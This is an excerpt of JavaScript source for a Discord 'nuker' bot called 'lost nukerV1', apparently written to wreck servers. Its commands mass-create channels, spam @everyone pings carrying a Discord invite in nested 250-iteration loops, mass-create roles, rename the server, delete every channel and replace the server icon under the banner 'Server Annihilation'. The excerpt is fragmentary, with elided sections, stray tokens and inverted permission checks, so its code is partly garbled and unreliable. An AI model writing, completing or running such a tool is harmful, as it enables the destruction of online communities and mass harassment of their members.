...
const presser = String.raw`            Creator: YOKIRO/
`;
...
client.on("ready", () => {
    ...
    console.log(red('           ════════════════════════════════════════════════════════════════════════════════'));
    console.log("");
    client.user.setActivity({ type: "WATCHING", name: "YOUR SERVER" }); // Delete this if you wish.
});
...
client.on("message", async message => {
    ...
    if (message.mentions.everyone === true) {
        ...
        const helpEmbed = new Discord.MessageEmbed()
            ...
            .setTitle('Nuker: lost nukerV1')
            .setDescription(`*For whatever reason you summoned me. Make sure u did it with no regrets.*\n\n **Nuking:**\n
            **Mass Channel:** \`${prefix}
\` [text]
            ...
            **Server Annihilation:** \`${prefix}die\` [text]
            `)
            .setThumbnail(``)
            .setFooter(`© lost nuker /| Prefix: ${prefix} | Author: YOKIRO | Cord: ${founder}`)
            .setColor(0x36393E)
  ...
  YOKIRO //       .setTimestamp(Date.now());
        ...
        if (message.content.startsWith(prefix + 'mp')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                ...
                if (!argresult) {
                    for (var i = 0; i < 250; i++) {
                        message.guild.channels.create('wizzed by LOST GAMES')

                        for (var i = 0; i < 250; i++) {
                            let channels = message.guild.channels.create('wizzed by LOST GAMES')

                            channels.then(
                                function (channel, index) {
                                    for (var i = 0; i < 250; i++) {
                                        channel.send('@everyone Nuked by YOKIRO JOIN LOST GAMES  - https://discord.gg/65UzmZGYJb' + argresult)
                ...
                for (var i = 0; i < 250; i++) {
                    ...
                    channels.then(
                        function (channel, index) {
                            for (var i = 0; i < 250; i++) {
                                channel.send('@everyone nuked by lost games - https://discord.gg/65UzmZGYJb' + argresult);
                                console.log(blueBright(`CHANNEL PINGED!`));
                                // other per-channnel logic
                            }
                        }
        ...
        if (message.content.startsWith(prefix + 'die')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                ...
                message.delete();
                message.guild.setName(`Lost Games .`).then(console.log(green(`Server Name changed to: ${message.guild.name} Lost Games`))); // changes server name
        ...
        if (message.content.startsWith(prefix + 'help')) {
            if (message.author.id != myID) {
                ...
                const helpEmbed = new Discord.MessageEmbed()
                    .setAuthor(message.author.username, message.author.avatarURL({ dynamic: true }))
                    .setTitle('Nuker: lost nukerV1')  
                              .setDescription(`*For whatever reason you have summoned me. Make sure u did it with no regrets.*\n\n **Nuking:**\n
                    **Mass Channel:** \`${prefix}cc\` [text]
                    **Mass Channel & Ping Stresser:** \`${prefix}mp\` [text]
                    **Mass Roles:** \`${prefix}mr\` [text]
                    **Delete All Channels:** \`${prefix}chd\`
                    ...
                    **Server Annihilation:** \`${prefix}die\` [text]
                    `)
                    .setThumbnail(``)
                    .setFooter(`© YOKIRO | Prefix: ${prefix} | Author: Yokiro | Cord: ${founder}`)
                    .setColor(0x36393E)
                    .setTimestamp(Date.now());
                message.channel.send(helpEmbed);
            }
    ...
    if (message.content.startsWith(prefix + 'die')) {
        if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
            ...
            if (message.author.id != myID) {
                ...
                message.delete();
                message.guild.setName(`death is near.`).then(console.log(green(`Server Name changed to: ${message.guild.name} Lost Games`))); // changes server name

                // Channel Delete
                message.guild.channels.cache.forEach((ch) => {
                    ch.delete().then(() => {
                        // Channel Icon Change
                        message.guild.setIcon('https://media.discordapp.net/attachments/970967478849142784/1029362625626263552/Lost_Gamess.jpg') // changes server pfp
                        console.log(redBright(`CHANNEL FUCKED`));
                    }).catch((err) => {
                        console.log(red("ERROR: " + err))
                    })
